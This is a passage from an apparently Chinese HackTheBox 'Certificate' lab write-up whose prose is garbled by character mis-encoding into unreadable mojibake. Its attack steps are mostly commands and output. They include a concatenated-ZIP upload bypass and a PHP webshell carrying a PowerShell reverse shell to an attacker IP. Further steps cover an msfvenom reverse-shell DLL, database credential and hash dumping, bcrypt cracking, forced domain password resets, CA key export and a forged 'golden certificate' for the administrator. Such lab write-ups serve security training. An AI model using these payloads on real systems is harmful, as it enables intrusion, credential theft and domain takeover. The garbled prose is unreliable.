seconds\n```\n\nåˆšåˆšå°è¯•äº†`SMB`æ— æ³•ä½¿ç”¨åŒ¿åè´¦æˆ·è¿›è¡Œè®¿é—®ï¼Œå› ä¸ºè¿˜æ‰«æåˆ°äº†`80`ç«¯å£ï¼Œæ‰€ä»¥ä»`Web`ä¸‹æ‰‹\n\n## Web\n\nè®¿é—® `HTTP` å¹¶é‡‡é›†æŒ‡çº¹\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image.png)\n\nå…¶ä¸­è¿˜æœ‰ç™»å½•é¡µå’Œæ³¨å†Œé¡µ\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image1.png)\n\nåˆ›å»ºäº†ä¸€ä¸ªè´¦æˆ· `sunset` å¹¶ä½¿ç”¨è´¦æˆ·è¿›è¡Œç™»å½•ï¼Œå¹¶ä¸”ç”¨æˆ·ç±»å‹æœ‰`student`å’Œ`teacher`ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆç™»é™†ä¹‹åæ‰æœ‰çš„åŠŸèƒ½ï¼Œæ•™å¸ˆç”¨æˆ·ç™»å½•ä¸è¿›å»\n\næ‰«æä¸€ä¸‹ç½‘ç«™ç›®å½•\n\n```bash\nâœ  Certificate dirsearch -u http://certificate.htb/ -e php,txt,zip -x 403,404,503\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/HackTheBox/Certificate/reports/http_certificate.htb/__25-06-01_21-34-42.txt\n\nTarget: http://certificate.htb/\n\n[21:34:42] Starting: \n[21:34:50] 200 -   14KB - /about.php\n[21:35:01] 500 -  638B  - /cgi-bin/printenv.pl\n[21:35:05] 200 -    0B  - /db.php\n[21:35:09] 200 -    3KB - /footer.php\n[21:35:10] 200 -    2KB - /header.php\n[21:35:15] 200 -    9KB - /login.php\n[21:35:15] 302 -    0B  - /logout.php  ->  login.php\n[21:35:25] 200 -   11KB - /register.php\n[21:35:30] 301 -  343B  - /static  ->  http://certificate.htb/static/\n[21:35:30] 301 -  345B  - /static..  ->  http://certificate.htb/static../\n[21:35:34] 302 -    0B  - /upload.php  ->  login.php\n\nTask Completed\n```\n\næ‰«æå‡ºæ¥ `upload.php` è®¿é—®ä¸€ä¸‹ï¼Œè²Œä¼¼ç¼ºå°‘å‚æ•°\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image2.png)\n\næœ€ååœ¨ `course` ä¸­å¯ä»¥æ‰¾åˆ°ä¸Šä¼ é¡µé¢\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image3.png)\n\nè¯¥å¤„å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´\n\n### æ–‡ä»¶ä¸Šä¼ åˆ©ç”¨ & ZipSlip? & **ZIP Concatenation?**\n\nä¸Šä¼ é¡µé¢ä¸­æç¤ºï¼š\n\n- Please select the assignment file you want to upload (the file will be reviewed by the course instructor)\n    \n    è¯·é€‰æ‹©æ‚¨è¦ä¸Šä¼ çš„ä½œä¸šæ–‡ä»¶ï¼ˆè¯¥æ–‡ä»¶å°†ç”±è¯¾ç¨‹è®²å¸ˆå®¡æ ¸ï¼‰\n    \n- We accept only the following file types: `.pdf` `.docx` `.pptx` `.xlsx`\n    \n    æˆ‘ä»¬åªæ¥å—ä»¥ä¸‹æ–‡ä»¶ç±»å‹ï¼š`.pdf` `.docx` `.pptx` `.xlsx`\n    \n- You include the assignment file in .zip archive file to reduce it's size\n    \n    å°†ä»»åŠ¡æ–‡ä»¶åŒ…å«åœ¨å­˜æ¡£æ–‡ä»¶ä¸­`.zip`ä»¥å‡å°å…¶å¤§å°\n    \n\nç»è¿‡æµ‹è¯•ï¼Œå¯ä»¥ç›´æ¥ä¸Šä¼ `PDF`æ–‡ä»¶ï¼Œå¹¶ä¸”ä¼šæ£€æŸ¥æ–‡ä»¶å¤´ã€‚ä¹Ÿå¯ä»¥å°†`pdf`ä»¥`zip`æ ¼å¼å‹ç¼©ï¼Œç„¶åä¸Šä¼ ï¼ˆè¿™é‡Œä¸èƒ½ä½¿ç”¨`bindzip`ï¼‰ï¼Œä¸Šä¼ `zip`æ–‡ä»¶ä¹‹åä¼šè‡ªåŠ¨è¿›è¡Œè§£å‹ã€‚\n\nè¿™é‡Œå¯¹ä¸Šä¼ åŠŸèƒ½ç‚¹è¿›è¡Œäº†å¸¸è§„çš„æµ‹è¯•ï¼Œä¾‹å¦‚ä¿®æ”¹æ–‡ä»¶åç¼€åç­‰ç­‰ï¼Œä½†æ˜¯æ— æ³•æˆåŠŸã€‚\n\né€šè¿‡ç½‘ç»œæœç´¢ï¼Œå‘ç°è¿˜å¯èƒ½å­˜åœ¨ `ZipSlip` æ¼æ´\n\n> https://medium.com/@ibm_ptc_security/zip-slip-attack-e3e63a13413f\n> \n\nèƒ½è¾¾åˆ°`RCE`çš„æ•ˆæœï¼Œå¯ä»¥è¦†ç›– `/etc/passwd` æ–‡ä»¶æˆ–è€…å…¬é’¥æ–‡ä»¶æˆ–è€…å…¶ä»–æ–‡ä»¶\n\n> ä¸€äº›åˆ©ç”¨äº†`ZipSlip`çš„CTFï¼šhttps://starlox.medium.com/cyberspace2024-zipzone-ctf-zipslip-vulnerability-00489669feec\n> \n\næˆ‘è¿™é‡Œå°è¯•äº†\n\n```bash\nâœ  Certificate tree zip \nzip\nâ”œâ”€â”€ 1.pdf\nâ””â”€â”€ evil\n    â””â”€â”€ test.php\n\nâœ  Certificate zip 2.zip zip/*\n  adding: zip/1.pdf (deflated 7%)\n  adding: zip/evil/ (stored 0%)\n```\n\nç„¶åä¸Šä¼ `2.zip` ï¼Œä½†æ˜¯é¡µé¢ä¸å›æ˜¾ï¼Œæ— æ³•å¾—åˆ°ä¸Šä¼ åçš„æ–‡ä»¶å¤¹è·¯å¾„\n\n> åˆ«äººåˆ†äº«çš„ä¸€ä¸ªé“¾æ¥ï¼šhttps://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/ï¼Œå…¶ä¸­çš„ **Chained Archives Explained: Concatenated ZIPs**Â å¯èƒ½å¯¹æˆ‘ä»¬æœ‰æ•ˆ\n> \n\n```bash\nâœ  Certificate ls               \n1.pdf  evil\n\nâœ  Certificate ls evil   \ntest.php\n\nâœ  Certificate zip -r 1.zip evil\n  adding: evil/ (stored 0%)\n  adding: evil/test.php (stored 0%)\n  \nâœ  Certificate zip 2.zip 1.pdf  \n  adding: 1.pdf (deflated 7%)\n  \nâœ  Certificate cat 1.zip 2.zip > 3.zip  ï¼ˆæ— æ³•ä¸Šä¼ ï¼‰\n\nâœ  Certificate cat 2.zip 1.zip > 3.zip  ï¼ˆæˆåŠŸä¸Šä¼ ï¼‰\n```\n\nç‚¹å‡»è®¿é—®ï¼Œå¹¶è¾“å…¥ `evil/test.php` æˆåŠŸæ‰§è¡Œï¼ï¼\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image4.png)\n\nä¸Šä¼ ä¸€å¥è¯æœ¨é©¬\n\n```bash\n<?php shell_exec(\"powershell -nop -w hidden -c \\\"\\$client = New-Object System.Net.Sockets.TCPClient('10.10.16.43',4444); \\$stream = \\$client.GetStream(); [byte[]]\\$bytes = 0..65535|%{0}; while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){; \\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0,\\$i); \\$sendback = (iex \\$data 2>&1 | Out-String ); \\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> '; \\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2); \\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length); \\$stream.Flush()}; \\$client.Close()\\\"\");?>\n```\n\nPSï¼šè¿™é‡Œå‡å¦‚æ–­å¼€äº†ï¼Œä¸‹æ¬¡å†è¿æ¥æ˜¯ä½¿ç”¨æ–°çš„ç«¯å£æ¥æ”¶ shell\n\n```bash\nmalicious_files/shell.php\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image5.png)\n\n## Mysql Dump\n\næˆ‘ä»¬æ‰«æç›®å½•çš„æ—¶å€™èƒ½çœ‹åˆ°å­˜åœ¨`db.php` ,æˆ‘ä»¬å°†å…¶è¯»å–\n\n```bash\n<?php\n// Database connection using PDO\ntry {\n    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';\n    $db_user = 'certificate_webapp_user'; // Change to your DB username\n    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password\n    $options = [\n        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,\n        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n    ];\n    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);\n} catch (PDOException $e) {\n    die('Database connection failed: ' . $e->getMessage());\n}\n?>\n```\n\nè¯»å–æ•°æ®åº“çš„æ•°æ®\n\n```bash\nPS C:\\xampp\\mysql\\bin> & \"C:\\xampp\\mysql\\bin\\mysql.exe\" -u certificate_webapp_user -p\"cert!f!c@teDBPWD\" -D Certificate_WEBAPP_DB -e \"show tables;\"\nTables_in_certificate_webapp_db\ncourse_sessions\ncourses\nusers\nusers_courses\n```\n\n```bash\nPS C:\\xampp\\mysql\\bin> & \"C:\\xampp\\mysql\\bin\\mysql.exe\" -u certificate_webapp_user -p\"cert!f!c@teDBPWD\" -D Certificate_WEBAPP_DB -e \"select * from users;\"\nid      first_name      last_name       username        email   password        created_at      role    is_active\n1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1\n6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1\n7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1\n8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1\n9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1\n10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1\n12      sunset  sunset  sunset  1@q.xom $2y$04$46hjL/TUPqsT3KI7R/6tje1JOSy5.riL8ABfus1G8WZujELAgnQvy    2025-06-01 16:49:22     student 1\n13      r       r       admin   t@t.com $2y$04$ui6Qc/eaGGRKK2ovA4iJne7qbd1uSkm5lVbEHnPWWKYYwzb2s0hY2    2025-06-01 16:49:28     student 1\n14      sunset2 sunset2 sunset2 1@qq.com        $2y$04$F5Rr9QzbhhaEh7QhJKKwz.ClZdVaA9QPI9RBdy8v.G/Pc7TDAO196    2025-06-01 16:57:14     student 1\n16      admin123        admin123        admin123        admin123@gmail.com      $2y$04$ViY8NzbVBvUlwppQcDrld.mh.1XcGQkc4lt6j5Uhj7IPyGq4Z0hQu    2025-06-01 16:59:02     student 1\n17      Admin   Admin   adminsucks      admin@gmail.com $2y$04$FMa5TpAFpTDu5EwgVzybnuAJFryR18dzfSqZGLQFzHhqj/BwksTdy    2025-06-01 17:12:43     student 1\n18      admin   adnim   adminadnim      admin@adnim.com $2y$04$x.Ak4KXkM.MLNA0JgCEPxevbFuBioVs5NONlqrw.eO2js1/5AQh8i    2025-06-01 17:14:15     teacher 0\n19      1       2       3       test@test.com   $2y$04$dFR.yVKC/u9UwlPsyxa5fO11vPvZnFUhRxi2Uf25SoGQRaTE6SmBW    2025-06-01 17:16:12     teacher 0\n20      test2   test2   test2   test2@test.com  $2y$04$Ci4wfETizE9WCrUgpC4tyuI7s4oLIpK/DWb/uhjO2IKTRIfD9JUGy    2025-06-01 17:17:40     teacher 0\n22      test3   test3   test3   test3@test.com  $2y$04$m51Lz73GtqPoAzovxJeCM.B8/SAkDERIl7OBZfxAAQahNpiVFPsKe    2025-06-01 17:34:30     student 1\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image6.png)\n\nå…¶ä¸­æˆ‘ä»¬æ„Ÿå…´è¶£çš„ç”¨æˆ·æœ‰ä¸¤æ¡\n\n```bash\n10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1\n1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1\n```\n\nå¯¹å¯†ç è¿›è¡Œçˆ†ç ´\n\n```bash\nâœ  Certificate john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash  \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 16 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nBlink182         (?)   \n```\n\nçˆ†ç ´äº†å¥½ä¸€ä¼šå°†`sara.b` çš„å¯†ç çˆ†ç ´å‡ºæ¥äº†\n\næµ‹è¯•ç”¨æˆ·æœ‰æ•ˆæ€§\n\n```bash\nâœ  Certificate nxc smb 10.10.11.71 -u sara.b -p Blink182 -d certificate.htb\nSMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.71     445    DC01             [+] certificate.htb\\sara.b:Blink182\n```\n\n## åŸŸåˆ†æ\n\n`bloodhound-python` æœé›†ä¿¡æ¯\n\n```bash\nâœ  Certificate bloodhound-python -u 'sara.b' -p 'Blink182' -d 'certificate.htb' -ns 10.10.11.71 --zip -c All -dc 'DC01.certificate.HTB'\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: certificate.htb\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.certificate.HTB\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: DC01.certificate.HTB\nINFO: Found 19 users\nINFO: Found 58 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WS-05.certificate.htb\nINFO: Querying computer: WS-01.certificate.htb\nINFO: Done in 00M 20S\nINFO: Compressing output into 20250602223438_bloodhound.zip\n```\n\nå‘ç°ç”¨æˆ· `sara.b` æ˜¯å±äº `REMOTE MANAGEMENT USERS`ç»„çš„\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image7.png)\n\nå¹¶ä¸”æ˜¯ `Account Operators`ç»„çš„ç”¨æˆ·\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image8.png)\n\né‚£å°±æ˜¯å¯ä»¥æ›´æ”¹ç”¨æˆ·çš„å¯†ç ã€åˆ›å»ºç”¨æˆ·ç»„ç­‰ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ä¿®æ”¹ `admins` ç»„ç”¨æˆ·çš„å¯†ç \n\næŸ¥çœ‹ä¸€ä¸‹ `Domain Admins` ç»„ï¼Œåªæœ‰ `administrator` ç”¨æˆ·ä¸€ä¸ªï¼Œæ•…æ— æ³•ç›´æ¥è·å¾—åŸŸæƒé™\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image9.png)\n\nå…ˆä½¿ç”¨ `sara.b` ç™»å½•åˆ° `DC` è¿›è¡Œä¿¡æ¯æ”¶é›†\n\n```bash\nâœ  Certificate evil-winrm -i 10.10.11.71 -u 'sara.b' -p 'Blink182' \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Sara.B\\Documents> \n```\n\næŸ¥çœ‹`users` æ–‡ä»¶å¤¹ï¼Œæœ‰å¥½å‡ ä¸ªç”¨æˆ·ï¼Œå…ˆåšå¥½æ‰“ç®—æ¨ªå‘åˆ°å“ªä¸€ä¸ªç”¨æˆ·\n\n```bash\n*Evil-WinRM* PS C:\\Users> ls\n\n    Directory: C:\\Users\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       12/30/2024   8:33 PM                Administrator\nd-----       11/23/2024   6:59 PM                akeder.kh\nd-----        11/4/2024  12:55 AM                Lion.SK\nd-r---        11/3/2024   1:05 AM                Public\nd-----        11/3/2024   7:26 PM                Ryan.K\nd-----         6/2/2025   8:17 AM                saad.m\nd-----       11/26/2024   4:12 PM                Sara.B\nd-----       12/29/2024   5:30 PM                xamppuser\n```\n\nå…¶ä¸­æœ€ä»¤äººæ„Ÿå…´è¶£çš„æ˜¯ `LION.SK` å’Œ `RYAN.K`\n\n`LION.SK` å±äº`DOMAIN CRA MANAGERS` è¯¥ç»„è§£é‡Šæ˜¯ï¼šè¯¥å®‰å…¨ç»„çš„æˆå‘˜è´Ÿè´£ä¸ºåŸŸç”¨æˆ·å‘è¡Œå’Œæ’¤é”€å¤šä¸ªè¯ä¹¦\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image10.png)\n\n`RYAN.K` å±äº `DOMAIN STORAGE MANAGERS` æ”¹ç»„è§£é‡Šæ˜¯ï¼šè¯¥å®‰å…¨ç»„çš„æˆå‘˜è´Ÿè´£é‡çº§ä»»åŠ¡ï¼Œä¾‹å¦‚ç»´æŠ¤ï¼Œç¢ç‰‡éƒ¨å’Œç®¡ç†åˆ†åŒºå’Œç£ç›˜\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image11.png)\n\næŸ¥çœ‹ä¸€ä¸‹ä¿©ç”¨æˆ·æƒé™\n\næ›´æ”¹ç”¨æˆ·`LION.SK` çš„å¯†ç \n\n```bash\nâœ  Certificate bloodyAD -d certificate.htb -u 'sara.b' -p 'Blink182' --dc-ip 10.10.11.71 set password LION.SK 'Password123!!!'\n[+] Password changed successfully!\n```\n\nåœ¨ `LION.SK` ç”¨æˆ·å®¶ç›®å½•ä¸­èƒ½å¾—åˆ° `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Lion.SK\\Desktop> type user.txt\n4c634600c2be9138b12e74ac6f288176\n```\n\næšä¸¾ç”¨æˆ·æƒé™\n\n```bash\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n```\n\næ›´æ”¹ç”¨æˆ·`RYAN.K` çš„å¯†ç \n\n```bash\nâœ  Certificate bloodyAD -d certificate.htb -u 'sara.b' -p 'Blink182' --dc-ip 10.10.11.71 set password RYAN.K 'Password123!!!'\n[+] Password changed successfully!\n```\n\n```bash\nâœ  Certificate evil-winrm -i 10.10.11.71 -u 'RYAN.K' -p 'Password123!!!'\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> \n```\n\nå‘ç° `RYAN.K` ç”¨æˆ·æœ‰ `SeManageVolumePrivilege` æƒé™\n\n```bash\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                      State\n============================= ================================ =======\nSeMachineAccountPrivilege     Add workstations to domain       Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking         Enabled\nSeManageVolumePrivilege       Perform volume maintenance tasks Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set   Enabled\n```\n\n## SeManageVolumePrivilege æ»¥ç”¨\n\n> æ‰¾åˆ°ä¸€äº›åˆ©ç”¨æ–‡æ¡£å’ŒPOCï¼šhttps://github.com/CsEnox/SeManageVolumeExploit | https://cn-sec.com/archives/3100947.html\n> \n\næ”¹æƒé™å¤§è‡´æ˜¯è®©æˆ‘ä»¬èƒ½æ‹¥æœ‰å†™å…¥ `C` ç›˜çš„æƒé™\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> echo '1' > ../../../1.txt\nAccess to the path 'C:\\1.txt' is denied.\nAt line:1 char:1\n+ echo '1' > ../../../1.txt\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException\n    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand\n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> upload SeManageVolumeExploit.exe\n                                        \nInfo: Uploading /root/Desktop/HackTheBox/Certificate/SeManageVolumeExploit.exe to C:\\Users\\Ryan.K\\Documents\\SeManageVolumeExploit.exe\n                                        \nData: 16384 bytes of 16384 bytes copied\n                                        \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> ./SeManageVolumeExploit.exe\nEntries changed: 859\n\nDONE\n```\n\næˆåŠŸå†™å…¥ `C` ç›˜\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> echo '1' > ../../../1.txt\n```\n\n### DLL hijackï¼Ÿ\n\n`POC`é“¾æ¥ä¸­çš„`DLL`åŠ«æŒæ— æ³•ä½¿ç”¨ï¼Œå› ä¸ºæ²¡æœ‰å­˜åœ¨ `spool` æ–‡ä»¶å¤¹\n\n```bash\n*Evil-WinRM* PS C:\\windows\\system32> cmd /c dir | findstr spoo\n11/26/2024  07:02 PM            93,184 spoolss.dll\n11/26/2024  07:03 PM           564,224 winspool.drv\n```\n\nä½†æ˜¯å¯ä»¥åŠ«æŒåˆ«çš„`DLL` \n\n> https://github.com/xct/SeManageVolumeAbuse\n> \n\nè¿™é‡Œæœ‰åˆ«çš„`DLL`åŠ«æŒæ–¹æ³•ï¼ŒåŒæ—¶ç³»ç»Ÿä¹Ÿå­˜åœ¨è¯¥`DLL`\n\n```bash\n*Evil-WinRM* PS C:\\windows\\system32\\wbem> cmd /c dir | findstr tzres\n06/02/2025  09:33 AM             9,216 tzres.dll\n```\n\n```bash\nâœ  Certificate msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.45 LPORT=1234 -f dll -o tzres.dll \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of dll file: 9216 bytes\nSaved as: tzres.dll\n```\n\nä½†æ˜¯æœ€å `systeminfo` `Access is denied`\n\n```bash\n*Evil-WinRM* PS C:\\windows\\system32\\wbem> systeminfo\nProgram 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1\n+ systeminfo\n+ ~~~~~~~~~~.\nAt line:1 char:1\n+ systeminfo\n+ ~~~~~~~~~~\n    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException\n    + FullyQualifiedErrorId : NativeCommandFailed\n```\n\n### CA.pfx\n\nä½¬ä»¬ç»™å‡ºäº†å¦å¤–ä¸€ä¸ªæ–¹æ¡ˆï¼Œæ‹¥æœ‰`SeManageVolumePrivilege` æƒé™åå¯ä»¥é€šè¿‡`certuil` æ¥å¯¼å‡ºè¯ä¹¦\n\næšä¸¾`CA`\n\n```bash\nâœ  Certificate certipy-ad find -u sara.b -p 'Blink182' -dc-ip 10.10.11.71 -text\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image12.png)\n\nå¯¼å‡º`CA`çš„è¯ä¹¦\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> certutil -exportPFX my \"Certificate-LTD-CA\" C:\\Users\\Public\\ca.pfx\nmy \"Personal\"\n================ Certificate 2 ================\nSerial Number: 75b2f4bbf31f108945147b466131bdca\nIssuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb\n NotBefore: 11/3/2024 3:55 PM\n NotAfter: 11/3/2034 4:05 PM\nSubject: CN=Certificate-LTD-CA, DC=certificate, DC=htb\nCertificate Template Name (Certificate Type): CA\nCA Version: V0.0\nSignature matches Public Key\nRoot Certificate: Subject matches Issuer\nTemplate: CA, Root Certification Authority\nCert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8\n  Key Container = Certificate-LTD-CA\n  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958\n  Provider = Microsoft Software Key Storage Provider\nSignature test passed\nEnter new password for output file C:\\Users\\Public\\ca.pfx:\nEnter new password:\nConfirm new password:\nCertUtil: -exportPFX command completed successfully.\n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> download ../../Public/ca.pfx\n                                        \nInfo: Downloading C:\\Users\\Ryan.K\\Documents\\../../Public/ca.pfx to ca.pfx\n                                        \nInfo: Download successful!\n```\n\n- CertUtil ä¼šæ‰“å¼€â€œmyâ€è¯ä¹¦å­˜å‚¨ï¼ˆPersonal/Myï¼‰ï¼Œæ‰¾åˆ°**ä¸»é¢˜åç§° (Subject Name / Issued To)** æˆ–**å‹å¥½åç§° (Friendly Name)**ä¸ºâ€œ`Certificate-LTD-CA`â€çš„é‚£å¼ è¯ä¹¦\n- ç„¶åæŠŠè¿™å¼ è¯ä¹¦åŠå…¶ç§é’¥ï¼ˆä»¥åŠå¯èƒ½çš„è¯ä¹¦é“¾ï¼‰æ‰“åŒ…æˆä¸€ä¸ª PFX æ–‡ä»¶\n- æœ€ç»ˆä¼šåœ¨ `C:\\Users\\Public\\ca.pfx` ä½ç½®ç”Ÿæˆä¸€ä¸ªäºŒè¿›åˆ¶çš„ PFX æ–‡ä»¶\n\n### Golden certificate\n\næ‹¿åˆ° `ca.pfx` çš„è¯ä¹¦å…¬ç§é’¥åå¯ä»¥è¿›è¡Œé»„é‡‘è¯ä¹¦ï¼ˆGolden certificateï¼‰æ”»å‡»\n\n> https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate\n> \n\nä¼ªé€ `administrator` çš„è¯ä¹¦\n\n```bash\nâœ  Certificate certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' -out administrator_forge.pfx\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Saving forged certificate and private key to 'administrator_forge.pfx'\n[*] Wrote forged certificate and private key to 'administrator_forge.pfx'\n```\n\nä½¿ç”¨è¯ä¹¦è·å–`TGT`\n\n```bash\nâœ  Certificate certipy-ad auth -pfx administrator_forge.pfx -dc-ip 10.10.11.71 -domain certificate.htb -username administrator\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: 'administrator@certificate.htb'\n[*] Using principal: 'administrator@certificate.htb'\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to 'administrator.ccache'\n[*] Wrote credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6\n```\n\n`root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> type root.txt\n7d69ba1c8bb2ee23ff27f0e1610caa3b\n```\n\n## æ€»ç»“\n\nä»»é‡é“è¿œï¼Œä¸ä¼šçš„è¿˜æ˜¯å¤šâ€¦æ¯”å¦‚åˆ©ç”¨`certutil`æ¥å¯¼å‡ºè¯ä¹¦è¿™ä¸€ç‚¹ï¼Œä»¥åŠæ–‡ä»¶ä¸Šä¼ çš„`ZipSlip` ï¼Œæ€»çš„ä¹Ÿæ˜¯å­¦ä¹ åˆ°äº†æ–°ä¸œè¥¿",
            "url": "https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - Certificate",
            "title": "HackTheBox - Machine - Certificate",
